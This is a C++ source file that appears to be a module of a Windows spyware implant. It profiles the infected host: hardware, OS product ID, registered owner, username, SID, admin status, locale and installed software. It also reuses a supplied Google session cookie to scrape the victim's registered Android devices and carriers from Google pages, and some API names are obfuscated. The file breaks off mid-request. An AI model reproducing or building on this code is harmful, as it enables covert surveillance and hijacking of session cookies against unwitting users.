#include <Windows.h>
#include <lm.h>
#include <Sddl.h>
#include <Strsafe.h>

#include "globals.h"
#include "zmem.h"
#include "utils.h"
#include "debug.h"

#include "device.h"
#include "social.h"
#include "JSON.h"

extern DWORD ConvertToUTF8(LPWSTR pIn, LPSTR* pOut);
extern void GD_DumpBuffer(LPCWSTR lpFileName, char* lpBuffer, DWORD dwSize);

HANDLE g_hDevMutex = NULL;

PDEVICE_CONTAINER lpDeviceContainer = NULL;

BOOL bSendGoogleDevice = TRUE;

VOID GetProcessor(PDEVICE_INFO lpDeviceInfo)
{
	WCHAR strCentralProcKey[] = HWD_DESC_SYS_CENTRALPROC_0;
	WCHAR strProcNameString[] = PROCESSOR_NAME_STRING;

	GetRegistryValue(HKEY_LOCAL_MACHINE, 
		strCentralProcKey, 
		strProcNameString, 
		(LPBYTE) lpDeviceInfo->procinfo.proc, 
		sizeof(lpDeviceInfo->procinfo.proc), 
		KEY_READ);

	LPSYSTEM_INFO lpSysInfo = (LPSYSTEM_INFO) zalloc(sizeof(SYSTEM_INFO));
	GetSystemInfo(lpSysInfo);
	lpDeviceInfo->procinfo.procnum = lpSysInfo->dwNumberOfProcessors;

	zfree(lpSysInfo);
}

VOID GetMemory(PDEVICE_INFO lpDeviceInfo)
{
	LPMEMORYSTATUSEX lpMemoryStatus = (LPMEMORYSTATUSEX) zalloc(sizeof(MEMORYSTATUSEX));
	lpMemoryStatus->dwLength = sizeof(MEMORYSTATUSEX);
	GlobalMemoryStatusEx(lpMemoryStatus);
	
	lpDeviceInfo->meminfo.memtotal = (ULONG) (lpMemoryStatus->ullTotalPhys / (1024*1024));
	lpDeviceInfo->meminfo.memfree = (ULONG) (lpMemoryStatus->ullAvailPhys / (1024*1024));
	lpDeviceInfo->meminfo.memload = (ULONG) (lpMemoryStatus->dwMemoryLoad);

	zfree(lpMemoryStatus);
	lpMemoryStatus = NULL;
}

BOOL CompareServicePack(WORD servicePackMajor)
{
    OSVERSIONINFOEX osVersionInfo;
    
	ZeroMemory(&osVersionInfo, sizeof(OSVERSIONINFOEX));
    
	osVersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    osVersionInfo.wServicePackMajor = servicePackMajor;
    ULONGLONG maskCondition = ::VerSetConditionMask(0, VER_SERVICEPACKMAJOR, VER_EQUAL);

    return ::VerifyVersionInfo(&osVersionInfo, VER_SERVICEPACKMAJOR, maskCondition);
}

VOID GetOs(PDEVICE_INFO lpDeviceInfo)
{
	WCHAR strNtCurrVersion[] = SOFTW_MICROS_WINNT_CURRVER;
	BOOL bRet;

	WCHAR strProductName[]= PRODUCT_NAME;
	GetRegistryValue(HKEY_LOCAL_MACHINE, 
		strNtCurrVersion, 
		strProductName, 
		lpDeviceInfo->osinfo.ver, 
		sizeof(lpDeviceInfo->osinfo.ver),
		KEY_READ);
		
	//NON e' QUI csdversion!! FIXME

	//provo a cercare il valore nel registry e in caso 
	//di errore o di stringa NULL, provo con la funzione PsGetVersion
	WCHAR strCsdVer[] = CSD_VERSION;
	bRet = GetRegistryValue(HKEY_LOCAL_MACHINE, 
							strNtCurrVersion, 
							strCsdVer, 
							lpDeviceInfo->osinfo.sp, 
							sizeof(lpDeviceInfo->osinfo.sp),
							KEY_READ);
/*
	if((bRet == FALSE) || (lpDeviceInfo->osinfo.sp == NULL))
	{
		VerSetConditionMask(VER_SERVICEPACKMAJOR|);

	}
*/
	
	WCHAR strProdId[] = PRODUCT_ID;
	GetRegistryValue(HKEY_LOCAL_MACHINE, 
		strNtCurrVersion, 
		strProdId, 
		lpDeviceInfo->osinfo.id, 
		sizeof(lpDeviceInfo->osinfo.id),
		KEY_READ); // non va FIXME!!!

	WCHAR strOwner[] = REGISTERED_OWNER;
	GetRegistryValue(HKEY_LOCAL_MACHINE, 
		strNtCurrVersion, 
		strOwner, 
		lpDeviceInfo->osinfo.owner, 
		sizeof(lpDeviceInfo->osinfo.owner),
		KEY_READ);

	WCHAR strOrg[]= REGISTERED_ORG;
	GetRegistryValue(HKEY_LOCAL_MACHINE, 
		strNtCurrVersion, 
		strOrg, 
		lpDeviceInfo->osinfo.org, 
		sizeof(lpDeviceInfo->osinfo.org),
		KEY_READ);
}

typedef NET_API_STATUS (WINAPI *NetUserGetInfo_p)(
	_In_   LPWSTR servername,
	_In_   LPWSTR username,
	_In_   DWORD level,
	_Out_  LPBYTE *bufptr);

typedef NET_API_STATUS (WINAPI *NetApiBufferFree_p)(_In_ LPVOID lpBuffer);

VOID GetUser(PDEVICE_INFO lpDeviceInfo)
{
	static NetUserGetInfo_p fpNetUserGetInfo = NULL;
	static NetApiBufferFree_p fpNetApiBufferFree = NULL;

	static WCHAR strNetApi32[] = NETAPI32;
	static CHAR strNetUserGetInfo[] = NETUSERGETINFO;
	static CHAR strNetApiBufferFree[] = NETAPIBUFFERFREE;

	if (fpNetUserGetInfo == NULL)
		fpNetUserGetInfo = (NetUserGetInfo_p) GetProcAddress(LoadLibrary(strNetApi32), strNetUserGetInfo);
	if (fpNetApiBufferFree == NULL)
		fpNetApiBufferFree = (NetApiBufferFree_p) GetProcAddress(LoadLibrary(strNetApi32), strNetApiBufferFree);


	DWORD dwSize = sizeof(lpDeviceInfo->userinfo.username) / sizeof(WCHAR);
	if (!GetUserName(lpDeviceInfo->userinfo.username, &dwSize))
		SecureZeroMemory(lpDeviceInfo->userinfo.username, sizeof(lpDeviceInfo->userinfo.username));
	else
	{
		if (fpNetUserGetInfo != NULL && fpNetApiBufferFree != NULL)
		{
			LPBYTE pUserInfo;
			if (fpNetUserGetInfo(NULL, lpDeviceInfo->userinfo.username, 1, &pUserInfo) == NERR_Success)
			{
				lpDeviceInfo->userinfo.priv = ((LPUSER_INFO_1)pUserInfo)->usri1_priv;
				fpNetApiBufferFree(pUserInfo);
			}

			if (fpNetUserGetInfo(NULL, lpDeviceInfo->userinfo.username, 23, &pUserInfo) == NERR_Success)
			{
				wcsncpy_s(lpDeviceInfo->userinfo.fullname, sizeof(lpDeviceInfo->userinfo.fullname) / sizeof(WCHAR), ((PUSER_INFO_23)pUserInfo)->usri23_full_name, _TRUNCATE);

				LPWSTR strSid;
				if (!ConvertSidToStringSid(((PUSER_INFO_23)pUserInfo)->usri23_user_sid, &strSid))
					SecureZeroMemory(lpDeviceInfo->userinfo.sid, sizeof(lpDeviceInfo->userinfo.sid));
				else
					wcsncpy_s(lpDeviceInfo->userinfo.sid, sizeof(lpDeviceInfo->userinfo.sid) / sizeof(WCHAR), strSid, _TRUNCATE);

				fpNetApiBufferFree(pUserInfo);
			}
		}
	}
}

VOID GetLocale(PDEVICE_INFO lpDeviceInfo)
{
	if (!GetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SISO639LANGNAME, lpDeviceInfo->localinfo.lang, sizeof(lpDeviceInfo->localinfo.lang) / sizeof(WCHAR)))
		SecureZeroMemory(lpDeviceInfo->localinfo.lang, sizeof(lpDeviceInfo->localinfo.lang));
	if (!GetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SISO3166CTRYNAME, lpDeviceInfo->localinfo.country, sizeof(lpDeviceInfo->localinfo.country) / sizeof(WCHAR)))
		SecureZeroMemory(lpDeviceInfo->localinfo.country, sizeof(lpDeviceInfo->localinfo.country));

	WCHAR strTimeZone[] = SYSTEM_CURRCON_CONTROL_TIMEZONE;
	WCHAR strBias[] = ACTIVE_TIME_BIAS;
	GetRegistryValue(HKEY_LOCAL_MACHINE, 
		strTimeZone, 
		strBias, 
		(LPBYTE)&lpDeviceInfo->localinfo.timebias, 
		sizeof(lpDeviceInfo->localinfo.timebias),
		KEY_READ);

	//get information about the timezone key name
	WCHAR strBuf[128];
	WCHAR strTMZKeyName[] = TMZ_KEY_NAME;
	GetRegistryValue(HKEY_LOCAL_MACHINE, 
		strTimeZone, 
		strTMZKeyName, 
		(LPBYTE)&strBuf, 
		sizeof(strBuf),
		KEY_READ);

	//read the timezone description	
	WCHAR strTimeZoneDesc[256];
	WCHAR strTMZKey[] = SOFTWARE_MICROSOFT_WINNT_CURR_TIMEZONES;
	WCHAR strTMZKeyDesc[] = TMZ_DESCRIPTION;
	_snwprintf_s(strTimeZoneDesc, sizeof(strTimeZoneDesc)/2, _TRUNCATE, L"%s\\%s", strTMZKey, strBuf);	

	
	GetRegistryValue(HKEY_LOCAL_MACHINE, 
		strTimeZoneDesc, 
		strTMZKeyDesc, 
		(LPBYTE)&lpDeviceInfo->localinfo.timezone, 
		sizeof(lpDeviceInfo->localinfo.timezone),
		KEY_READ);	
}

typedef BOOL (WINAPI *GetDiskFreeSpaceEx_p) (LPWSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER);
VOID GetDisk(PDEVICE_INFO lpDeviceInfo)
{
	static GetDiskFreeSpaceEx_p fpGetDiskFreeSpaceEx = NULL;
	static CHAR strGetDiskFreeSpaceEx[] = GETDISKFREESPACEEX;
	static WCHAR strKernel32[] = KERNEL32;

	if (fpGetDiskFreeSpaceEx == NULL)
	{
		fpGetDiskFreeSpaceEx = (GetDiskFreeSpaceEx_p) GetProcAddress(GetModuleHandle(strKernel32), strGetDiskFreeSpaceEx);
		if (fpGetDiskFreeSpaceEx)
		{
			LPWSTR strTempPath = (LPWSTR) zalloc(MAX_FILE_PATH * sizeof(WCHAR));

			if (GetTempPath(MAX_FILE_PATH, strTempPath))
			{
				ULARGE_INTEGER uDiskFree, uDiskTotal;
				if (fpGetDiskFreeSpaceEx(strTempPath, &uDiskFree, &uDiskTotal, NULL))
				{
					lpDeviceInfo->diskinfo.disktotal = (ULONG) (uDiskTotal.QuadPart / (1024*1024));
					lpDeviceInfo->diskinfo.diskfree = (ULONG) (uDiskFree.QuadPart / (1024*1024));
				}
				else
					lpDeviceInfo->diskinfo.disktotal = lpDeviceInfo->diskinfo.diskfree = 0;
			}

			zfree(strTempPath);
		}
	}
}


LPWSTR GetAppList()
{
	DWORD dwAppListSize = 0;
	DWORD dwSam = KEY_READ;
	WCHAR strUninstall[] = SOFTWARE_MICROSOFT_WIN_CURR_UNINSTALL;
	WCHAR strX86Header[] = APPLICATION_LIST_X86;
	WCHAR strX64Header[] = APPLICATION_LIST_X64;
	BOOL bIsWow64, bIs64OS;

	IsX64System(&bIsWow64, &bIs64OS);
	DWORD dwRepeat = 1 + bIsWow64;

	LPWSTR strAppList = (LPWSTR) zalloc((wcslen(strX86Header) + 1) * sizeof(WCHAR));
	StringCbCopy(strAppList, (wcslen(strX86Header) + 1) * sizeof(WCHAR), strX86Header);
	
	for (DWORD i=0; i<dwRepeat; i++)
	{
		HKEY hUninstall = GetRegistryKeyHandle(HKEY_LOCAL_MACHINE, strUninstall, dwSam);
		if (!hUninstall)
			return NULL;

		DWORD dwIdx = 0;
		while (1)
		{
			WCHAR strProductKey[128];
			WCHAR strTmpValue[256];

			DWORD dwLen = sizeof(strProductKey) / sizeof(WCHAR);
			if (RegEnumKeyEx(hUninstall, dwIdx++, strProductKey, &dwLen, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
				break;

			// if it has a parent then get the parent and skip this one
			WCHAR strParentKeyName[] = PARENT_KEY_NAME;
			if (GetRegistryValue(hUninstall, strProductKey, strParentKeyName, NULL, 0, dwSam)) 
				continue;

			// if it is a system component then skip it
			DWORD dwSysComponent;
			WCHAR strSysComponent[] = SYSTEM_COMPONENT;
			dwLen = sizeof(DWORD);
			if (GetRegistryValue(hUninstall, strProductKey, strSysComponent, (LPBYTE)&dwSysComponent, sizeof(DWORD), dwSam) && dwSysComponent == 1) 
				continue;


			// get data
			LPWSTR strProductName = NULL;
			LPWSTR strProductVersion = NULL;

			// name
			WCHAR strDisplayName[] = DISPLAY_NAME;
			dwLen = sizeof(strProductKey);
			if (!GetRegistryValue(hUninstall, strProductKey, strDisplayName, strTmpValue, dwLen, dwSam))
				continue;
			strProductName = _wcsdup(strTmpValue);

			// version
			WCHAR strDisplayVersion[] = DISPLAY_VERSION;
			dwLen = sizeof(strProductKey);
			if (GetRegistryValue(hUninstall, strProductKey, strDisplayVersion, strTmpValue, dwLen, dwSam))
				strProductVersion = _wcsdup(strTmpValue);

			// append to string
			dwAppListSize = (wcslen(strAppList) + wcslen(strProductName) + (strProductVersion ? wcslen(strProductVersion) : 0) + 5) * sizeof(WCHAR);
			strAppList = (LPWSTR) realloc(strAppList, dwAppListSize);

			StringCbCat(strAppList, dwAppListSize, strProductName);
			if (strProductVersion)
			{	
				StringCbCat(strAppList, dwAppListSize, L" (");
				StringCbCat(strAppList, dwAppListSize, strProductVersion);
				StringCbCat(strAppList, dwAppListSize, L")");
			}
			StringCbCat(strAppList, dwAppListSize, L"\n");

			zfree(strProductName);
			if (strProductVersion)
				zfree(strProductVersion);
		}

		if (i==0 && bIsWow64)
		{
			dwAppListSize += (wcslen(strX64Header)+2)*sizeof(WCHAR);
			strAppList = (LPWSTR) realloc(strAppList, dwAppListSize);
			StringCbCat(strAppList, dwAppListSize, L"\n");
			StringCbCat(strAppList, dwAppListSize, L"\n");
			StringCbCat(strAppList, dwAppListSize, strX64Header);
		}
				
		dwSam |= KEY_WOW64_64KEY;
		RegCloseKey(hUninstall);
	}

	return strAppList;
}

VOID GetDeviceInfo()
{
	BOOL bIsWow64, bIs64OS;

	if (lpDeviceContainer)
		return;

	//check the mutex
	if(g_hDevMutex != NULL)
		if(WaitForSingleObject(g_hDevMutex, 5000) != WAIT_OBJECT_0)
			return;

	PDEVICE_INFO lpDeviceInfo = (PDEVICE_INFO) zalloc(sizeof(DEVICE_INFO));
	LPWSTR strAppList = GetAppList();

	GetProcessor(lpDeviceInfo);
	GetMemory(lpDeviceInfo);
	GetOs(lpDeviceInfo);
	GetUser(lpDeviceInfo);
	GetLocale(lpDeviceInfo);
	GetDisk(lpDeviceInfo);

	IsX64System(&bIsWow64, &bIs64OS);

	DWORD dwSize = (sizeof(DEVICE_INFO) + (strAppList ? wcslen(strAppList)*sizeof(WCHAR) : 0) + 1024 + 1) * sizeof(WCHAR);
	LPWSTR strDeviceString = (LPWSTR) zalloc(dwSize);
	
	StringCbPrintf(strDeviceString, dwSize,
		L"CPU: %d x %s\n"  //FIXME: array
		L"Architecture: %s\n"  //FIXME: array
		L"RAM: %dMB free / %dMB total (%u%% used)\n"  //FIXME: array
		L"Hard Disk: %dMB free / %dMB total\n"  //FIXME: array
		L"\n"  //FIXME: array
		L"Windows Version: %s%s%s%s%s\n"  //FIXME: array
		L"Registered to: %s%s%s%s {%s}\n"  //FIXME: array
		//L"Locale: %s_%s (UTC %.2d:%.2d)\n"  //FIXME: array
		L"Locale: %s_%s (%s)\n"  //FIXME: array
		L"\n" 
		L"User Info: %s%s%s%s%s\n"  //FIXME: array
		L"SID: %s\n"  //FIXME: array
		L"\n%s\n",  //FIXME: array
		lpDeviceInfo->procinfo.procnum, lpDeviceInfo->procinfo.proc,
		bIs64OS ? L"64bit" : L"32bit",  //FIXME: array
		lpDeviceInfo->meminfo.memfree, lpDeviceInfo->meminfo.memtotal, lpDeviceInfo->meminfo.memload,
		lpDeviceInfo->diskinfo.diskfree, lpDeviceInfo->diskinfo.disktotal,
		lpDeviceInfo->osinfo.ver, (lpDeviceInfo->osinfo.sp[0]) ? L" (" : L"", (lpDeviceInfo->osinfo.sp[0]) ? lpDeviceInfo->osinfo.sp : L"", (lpDeviceInfo->osinfo.sp[0]) ? L")" : L"", bIs64OS ? L" (64-bit)" : L" (32-bit)",  //FIXME: array
		lpDeviceInfo->osinfo.owner, (lpDeviceInfo->osinfo.org[0]) ? L" (" : L"", (lpDeviceInfo->osinfo.org[0]) ? lpDeviceInfo->osinfo.org : L"", (lpDeviceInfo->osinfo.org[0]) ? L")" : L"", lpDeviceInfo->osinfo.id,
		//lpDeviceInfo->localinfo.lang, lpDeviceInfo->localinfo.country, (-1 * (int)lpDeviceInfo->localinfo.timebias) / 60, abs((int)lpDeviceInfo->localinfo.timebias) % 60,		
		lpDeviceInfo->localinfo.lang, lpDeviceInfo->localinfo.country, lpDeviceInfo->localinfo.timezone ? lpDeviceInfo->localinfo.timezone : L" Unknown",
		lpDeviceInfo->userinfo.username, (lpDeviceInfo->userinfo.fullname[0]) ? L" (" : L"", (lpDeviceInfo->userinfo.fullname[0]) ? lpDeviceInfo->userinfo.fullname : L"", (lpDeviceInfo->userinfo.fullname[0]) ? L")" : L"", (lpDeviceInfo->userinfo.priv) ? ((lpDeviceInfo->userinfo.priv == 1) ? L"" : L" [ADMIN]") : L" [GUEST]",  //FIXME: array
		lpDeviceInfo->userinfo.sid,
		strAppList ? strAppList : L"");

	lpDeviceContainer = (PDEVICE_CONTAINER) zalloc(sizeof(DEVICE_CONTAINER));
	lpDeviceContainer->pDataBuffer = strDeviceString;
	lpDeviceContainer->uSize = (wcslen(strDeviceString) + 1) * sizeof(WCHAR);

	zfree(strAppList);
	zfree(lpDeviceInfo);

	//release the mutex
	ReleaseMutex(g_hDevMutex);
}



//-----------------------------------GOOGLE DEVICE --------------------------------


DWORD GDev_ExtractDevList(LPWSTR *pwszFormattedList, LPSTR pszRecvBuffer)
{
	LPWSTR pwszTmp=NULL;
	LPSTR  pszFrom=NULL, pszTo=NULL;
	DWORD  dwRet=0, dwSize=0, dwNewSize=0;
	
	if(pszRecvBuffer == NULL)
		return FALSE;

	//search the JSON structure containing the devices info (es: ['DEVICES_JSPB'])
	pszFrom = StrStrIA(pszRecvBuffer, "['DEVICES_JSPB']");
	if(pszFrom == NULL)
		return FALSE;
	pszFrom++;

	//search the first [ char (beginning of the JSON struct)
	pszFrom = strstr(pszFrom, "[");
	if(pszFrom == NULL)
		return FALSE;

	//search a ; char (end of the JSON struct)
	pszTo = pszFrom;
	pszTo = strstr(pszFrom, ";");
	if(pszTo == NULL)
		return FALSE;

	dwSize = (pszTo - pszFrom) - 1;

	//copy the json structure to a tmp buffer
	LPSTR pszJSON = (LPSTR)malloc(dwSize+1);
	if(pszJSON == NULL)
		return FALSE;
	strncpy_s(pszJSON, dwSize+1, pszFrom, dwSize);

	//parse the json struct
	JSONValue *jValue = NULL;
	JSONArray jArray, jDev;
	
	jValue = JSON::Parse(pszJSON);

	znfree(&pszJSON);

	if(jValue == NULL)
		return FALSE;


	LPWSTR pwszDevice = NULL;	

	if(jValue->IsArray() && (jValue->AsArray().size() > 0))
	{
		jArray = jValue->AsArray();

		if(jArray.size() > 0)
		{ 
			jArray = jArray[0]->AsArray();

			//loop into array of devices
			for(int i=0; i<jArray.size(); i++)
			{				
				jDev = jArray[i]->AsArray();
				jDev = jDev[0]->AsArray();

				dwSize = wcslen(jDev[2]->AsString().c_str()) +
						 wcslen(jDev[3]->AsString().c_str()) +
						 wcslen(jDev[4]->AsString().c_str()) + 64; //add some bytes to store the description strings

				pwszDevice = (LPWSTR)malloc(dwSize * sizeof(WCHAR));
				if(pwszDevice == NULL)
				{
					delete jValue;
					return FALSE;
				}

				swprintf_s(pwszDevice, dwSize, L"Brand: %s\nDevice: %s\nCarrier: %s\n\n", jDev[3]->AsString().c_str(), jDev[2]->AsString().c_str(), jDev[4]->AsString().c_str());

				dwNewSize += (wcslen(pwszDevice) + 1);

				pwszTmp = *pwszFormattedList;
				*pwszFormattedList = (LPWSTR)realloc(*pwszFormattedList, dwNewSize * sizeof(WCHAR));
				if(*pwszFormattedList == NULL)
				{
					znfree(&pwszDevice);
					znfree(&pwszTmp);
					delete jValue;
					return FALSE;
				}				
				if(pwszTmp == NULL)				
					SecureZeroMemory(*pwszFormattedList, dwNewSize * sizeof(WCHAR));				

				wcscat_s(*pwszFormattedList, dwNewSize, pwszDevice);

				znfree(&pwszDevice);
			}
		}
		else
		{
			delete jValue;
			return FALSE;
		}
	}
	else
	{
		delete jValue;
		return FALSE;
	}


	delete jValue;

	return TRUE;
}


//get the device list
DWORD GDev_GetDevices(LPSTR pszCookie)
{	
	WCHAR   pwszHeader[] = {L'\n', L'G', L'o', L'o', L'g', L'l', L'e', L' ', L'D', L'e', L'v', L'i', L'c', L'e', L's', L':', L'\n', L'\n', '\0'};
	LPWSTR	pwszDevicesList=NULL;
	LPSTR	pszRecvBuffer=NULL;
	DWORD	dwRet, dwBufferSize=0, dwSize=0, dwLen=0;
	CHAR    pszBuf[128];

	if(!bSendGoogleDevice)		
		return FALSE;

	if(lpDeviceContainer)
		return FALSE;

	if(g_hDevMutex == NULL)
		return FALSE;

	//get conn parameters
	dwRet = HttpSocialRequest(L"www.google.com",
							  L"GET",
							  L"/android/devicemanager",
							  L"Host: www.google.com\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*",
							  443,
							  NULL,
							  0,
							  (LPBYTE *)&pszRecvBuffer,
							  &dwBufferSize,
							  pszCookie);

	if((dwRet != SOCIAL_REQUEST_SUCCESS) || (dwBufferSize == 0))
	{
		znfree(&pszRecvBuffer);
	}

	//extract the device list from the received buffer
	dwRet = GDev_ExtractDevList(&pwszDevicesList, pszRecvBuffer);
	znfree(&pszRecvBuffer);

	if((!dwRet) || (pwszDevicesList == NULL))
		return FALSE;

	//get the device info
	GetDeviceInfo();

	//wait for mutex
	if(WaitForSingleObject(g_hDevMutex, 5000) != WAIT_OBJECT_0)
		return FALSE;

	dwSize = wcslen(lpDeviceContainer->pDataBuffer) + wcslen(pwszHeader) + wcslen(pwszDevicesList) + 1;

	//append the google devices info to the device info
	lpDeviceContainer->pDataBuffer = (LPWSTR)realloc(lpDeviceContainer->pDataBuffer, dwSize * sizeof(WCHAR));
	wcscat_s(lpDeviceContainer->pDataBuffer, dwSize, pwszHeader);
	wcscat_s(lpDeviceContainer->pDataBuffer, dwSize, pwszDevicesList);

	lpDeviceContainer->uSize = dwSize * sizeof(WCHAR);

	znfree(&pwszDevicesList);

	//don't send the device list anymore
	bSendGoogleDevice = FALSE;

	//release the mutex for the device
	ReleaseMutex(g_hDevMutex);

	//close the handle to the mutex object
	CloseHandle(g_hDevMutex);
	g_hDevMutex = NULL;

	return TRUE;
}

#ifdef _GDEV_NEW_VERSIONS

LPSTR GDev_EncodeURL(LPSTR strString)
{
	LPSTR strEncoded = NULL;
	char strTmp[4];
	int i, j, dwLen;

	dwLen = strlen(strString);
	//alloc destination string
	strEncoded = (LPSTR)zalloc((dwLen*3) + 1);
	if(strEncoded == NULL)
		return NULL;

	SecureZeroMemory(strEncoded, sizeof(dwLen*3+1));

	for(i=0, j=0; i<dwLen; i++, j++)
	{
		switch(strString[i])
		{
			case '$':
			case '+':
			case ')':
			case ',':
			case ':':
			case ';':
			case '?':
			case '@':
				strEncoded[j++] = '%';
				sprintf(strTmp, "%02X", strString[i]);
				strcat(&strEncoded[j], strTmp);
				j += 1;
				break;
			default:
				strEncoded[j] = strString[i];
				break;
		}
	}
	strEncoded[j] = 0;

	return strEncoded;
}

//window._uc='[\42pb6_nYs3-m4J_ne7qHvKNy-S_ww:1423730549069\42
DWORD GDev_GetToken_V2(LPSTR *pszToken1, LPSTR pszBuffer)
{
	LPSTR pszFrom=NULL, pszTo=NULL;
	DWORD dwSize=0;

	//search the string "window._uc='[\42"
	pszFrom = strstr(pszBuffer, "window._uc='[\\42");
	if(pszFrom == NULL)
		return FALSE;
	pszFrom += (strlen("window._uc='[\\42"));
	pszTo = pszFrom;

	//search the first '\42'
	pszTo = strstr(pszFrom, "\\42");
	if(pszFrom == NULL)
		return FALSE;

	//skip the first " char
	pszTo -= 1;
	
	dwSize = pszTo - pszFrom;

	*pszToken1 = (LPSTR)malloc(dwSize + 1);
	if(*pszToken1 == NULL)
		return FALSE;
	strncpy_s(*pszToken1, dwSize+1, pszFrom, dwSize);

	return TRUE;
}

DWORD GDev_GetDevices_V2(LPSTR pszCookie)
{	
	LPWSTR	pwszDevicesList=NULL;
	LPSTR	pszRecvBuffer=NULL, pszToken=NULL;
	DWORD	dwRet, dwBufferSize=0, dwSize=0, dwLen=0;
	CHAR    pszBuf[128];

	if(!bSendGoogleDevice)
		return FALSE;

	//check the mutex
	if(hDevMutex == NULL)
		return FALSE;
	
	dwRet = HttpSocialRequest(L"play.google.com",
							  L"GET",
							  L"/settings",
							  L"Host: play.google.com\r\nConnection: keep-alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
							  443,
							  NULL,
							  0,
							  (LPBYTE *)&pszRecvBuffer,
							  &dwBufferSize,
							  pszCookie);

	GD_DumpBuffer(L"k:\\GDocs\\play_devices", pszRecvBuffer, dwBufferSize);

	//extract the token value
	dwRet = GDev_GetToken_V2(&pszToken, pszRecvBuffer);
	if(dwRet == FALSE)
	{
		znfree(&pszRecvBuffer);
		return FALSE;
	}
	znfree(&pszRecvBuffer);

	LPSTR pszEncBuf = GDev_EncodeURL(pszToken);
	LPSTR pszSendBuf = (LPSTR)malloc(256);
	sprintf_s(pszSendBuf, 256, "xhr=1&token=%s", pszEncBuf);	

	//get conn parameters
	dwRet = HttpSocialRequest(L"play.google.com",
							  L"POST",
							  L"/store/xhr/ructx",
							  L"Host: play.google.com\r\nConnection: keep-alive\r\nOrigin: https://play.google.com\r\nContent-Type: application/x-www-form-urlencoded;charset=UTF-8\r\nAccept: */*\r\nReferer: https://play.google.com/settings",
							  443,
							  (LPBYTE)pszSendBuf,
							  strlen(pszSendBuf),
							  (LPBYTE *)&pszRecvBuffer,
							  &dwBufferSize,
							  pszCookie);

	if((dwRet != SOCIAL_REQUEST_SUCCESS) || (dwBufferSize == 0))
	{
		znfree(&pszRecvBuffer);
	}

	//extract the device list from the received buffer
	dwRet = GDev_ExtractDevList(&pwszDevicesList, pszRecvBuffer);
	znfree(&pszRecvBuffer);

	if((!dwRet) || (pwszDevicesList == NULL))
		return FALSE;

	//get the device info
	GetDeviceInfo();

	//wait for mutex release
	if(WaitForSingleObject(hDevMutex, 5000) != WAIT_OBJECT_0)
		return FALSE;

	dwSize = wcslen(lpDeviceContainer->pDataBuffer) + wcslen(pwszDevicesList) + 1;

	//append the google devices info to the device info
	lpDeviceContainer->pDataBuffer = (LPWSTR)realloc(lpDeviceContainer->pDataBuffer, dwSize * sizeof(WCHAR));
	wcscat_s(lpDeviceContainer->pDataBuffer, dwSize, pwszDevicesList);

	lpDeviceContainer->uSize = dwSize * sizeof(WCHAR);

	znfree(&pwszDevicesList);

	ReleaseMutex(hDevMutex);

	bSendGoogleDevice = FALSE;

	return TRUE;
}


//["xsrf","AKbdrOanfw0bceGzySGgmi1nvJ4L33MG7A:1423498235308"
DWORD GDev_GetToken_V3(LPSTR *pszToken1, LPSTR *pszToken2, LPSTR pszBuffer)
{
	LPSTR pszFrom=NULL, pszTo=NULL;
	DWORD dwSize=0;

	//search the string "xsrf"
	pszFrom = strstr(pszBuffer, "[[\"xsrf\"");
	if(pszFrom == NULL)
		return FALSE;
	pszTo = pszFrom;

	//search the first '}'
	pszTo = strstr(pszFrom, "}");
	if(pszFrom == NULL)
		return FALSE;

	//skip the first " char
	pszTo -= 1;
	
	dwSize = pszTo - pszFrom;

	pszBuffer = (LPSTR)malloc(dwSize + 1);
	if(pszBuffer == NULL)
		return FALSE;
	strncpy_s(pszBuffer, dwSize+1, pszFrom, dwSize);

	JSONValue *jValue = NULL;
	JSONArray jArray;

	jValue = JSON::Parse(pszBuffer);
	znfree(&pszBuffer);

	if(jValue == NULL)
		return FALSE;

	if(jValue->IsArray())
	{
		jArray = jValue->AsArray();
	    if(jArray[0]->IsArray())
		{
			jArray = jArray[0]->AsArray();

			if(jArray.size() >= 4)
			{
				//get the first token
				if((jArray[1]->IsString()) && (jArray[1]->AsString().c_str() != NULL))
				{
					ConvertToUTF8((LPWSTR)jArray[1]->AsString().c_str(), pszToken1);
					if(*pszToken1 == NULL)
					{
						delete jValue;
						return FALSE;
					}
				}

				//get the second token
				if((jArray[3]->IsString()) && (jArray[3]->AsString().c_str() != NULL))
				{
					ConvertToUTF8((LPWSTR)jArray[3]->AsString().c_str(), pszToken2);
					if(*pszToken2 == NULL)
					{
						znfree(pszToken1);
						delete jValue;
						return FALSE;
					}
				}			
			}
		}
	}

	delete jValue;

	return TRUE;
}


//get the device list
DWORD GDev_GetDevices_V3(LPSTR pszCookie)
{	
	LPWSTR	pwszFormattedList=NULL;
	LPSTR	pszRecvBuffer=NULL, pszSendBuf=NULL, pszToken1=NULL, pszToken2=NULL;
	DWORD	dwRet, dwBufferSize=0, dwSize=0, dwLen=0;
	CHAR    pszBuf[128];	
	
	//check the mutex


	//get conn parameters
	dwRet = HttpSocialRequest(L"www.google.com",
							  L"GET",
							  L"/settings/dashboard/",
							  L"Host: www.google.com\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*\r\nReferer: https://accounts.google.com/b/0/VerifiedPhoneInterstitial?continue=https%3A%2F%2Fwww.google.com%2Fsettings%2Fdashboard&sarp=1",
							  443,
							  NULL,
							  0,
							  (LPBYTE *)&pszRecvBuffer,
							  &dwBufferSize,
							  pszCookie);

	if((dwRet != SOCIAL_REQUEST_SUCCESS) || (dwBufferSize == 0))
	{
		znfree(&pszRecvBuffer);
	}	

	//get the token parameter to use in next queries
	dwRet = GDev_GetToken_V3(&pszToken1, &pszToken2, pszRecvBuffer);
	znfree(&pszRecvBuffer);

	if(dwRet == FALSE)
		return FALSE;

	//post data
	LPSTR pszTmp = (LPSTR)malloc(512);
	if(pszTmp == NULL)
		return FALSE;
	sprintf_s(pszTmp, 512, "at=%s&azt=%s&", pszToken1, pszToken2);
	pszSendBuf = GDev_EncodeURL(pszTmp);
	znfree(&pszTmp);	

	//get conn parameters
	dwRet = HttpSocialRequest(L"www.google.com",
							  L"POST",
							  L"/_/fetch/?rt=c",
